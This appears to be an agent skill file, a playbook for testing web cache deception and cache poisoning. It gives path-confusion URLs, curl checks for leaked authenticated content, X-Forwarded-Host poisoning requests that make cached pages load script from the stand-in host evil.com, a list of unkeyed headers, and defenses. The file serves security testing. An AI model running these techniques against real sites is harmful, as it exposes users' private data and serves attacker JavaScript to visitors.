---
name: web-cache-deception
description: >-
  Web cache deception and poisoning playbook. Use when CDN, reverse proxy, or application caching may serve sensitive authenticated content to other users due to path confusion or cache key manipulation.
---

# SKILL: Web Cache Deception

## 1. CORE CONCEPTS

### Web Cache Deception (steal authenticated data)

```
Victim visits: https://target.com/account/profile/nonexistent.css
→ Application ignores suffix, serves /account/profile (with auth data)
→ CDN sees .css extension → caches the response
→ Attacker fetches: https://target.com/account/profile/nonexistent.css
→ CDN serves cached authenticated content → attacker reads victim's data
```

### Web Cache Poisoning (serve malicious content)

```
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
→ Application generates: <script src="https://evil.com/js/app.js">
→ Cache stores this response
→ Normal users hit cache → load attacker's JavaScript
```

---

## 2. CACHE DECEPTION METHODOLOGY

### Step 1: Identify Cacheable Path Patterns

```
.css  .js  .jpg  .png  .gif  .svg  .ico  .woff  .woff2  .ttf  .pdf  .json
```

### Step 2: Test Path Confusion

```text
https://target.com/api/me/info.css
https://target.com/account/profile/x.js
https://target.com/settings/avatar.png
https://target.com/dashboard/data.json
https://target.com/account/profile/..%2fstatic/app.css
```

### Step 3: Verify Caching

```bash
# Request as victim (authenticated):
curl -H "Cookie: session=VICTIM" https://target.com/account/profile/x.css
# X-Cache: MISS (first request)

# Request again as attacker (no auth):
curl https://target.com/account/profile/x.css
# X-Cache: HIT + victim's content? → vulnerable
```

### Path Separator Tricks

```text
/account/profile;.css       # semicolon
/account/profile%2F.css     # encoded slash
/account/profile/.css       # trailing dot
```

---

## 3. CACHE POISONING METHODOLOGY

### Unkeyed Input Discovery

```bash
# Test if X-Forwarded-Host is reflected but not keyed:
curl -H "X-Forwarded-Host: evil.com" https://target.com/page
# If response contains evil.com and caches → poisonable
```

### Common Unkeyed Headers

```
X-Forwarded-Host      X-Forwarded-Scheme    X-Forwarded-Proto
X-Original-URL        X-Rewrite-URL         X-Host
X-Forwarded-Server    Forwarded             True-Client-IP
```

### Host Header Poisoning

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

→ Response: <link href="//evil.com/static/main.css">
→ Cached → all users load attacker's CSS/JS
```

---

## 4. PATH NORMALIZATION DIFFERENCES

| Component | Behavior |
|---|---|
| CDN (Cloudflare, Akamai) | Caches based on full URL path including extension |
| Application (Rails, Django, Express) | May ignore trailing path segments or extensions |
| Reverse proxy (Nginx) | May strip or rewrite path before forwarding |

---

## 5. DEFENSE

- Cache only `/static/*`, `/assets/*` paths explicitly
- Set `Cache-Control: no-store, private` on authenticated endpoints
- Use `Vary: Cookie` to prevent cross-user cache hits
- Include all reflected headers in cache key
- Strip unknown headers at CDN edge

---

## 6. TESTING CHECKLIST

```
□ Identify CDN/cache layer (X-Cache, Age, Via headers)
□ Append .css/.js/.png to authenticated API endpoints
□ Check if response is cached (X-Cache: HIT on second request)
□ Test path separators: /x.css, ;.css, %2F.css
□ Test unkeyed headers: X-Forwarded-Host, X-Original-URL
□ Verify Cache-Control headers on sensitive endpoints
□ Check Vary header presence
□ Test with and without authentication
```
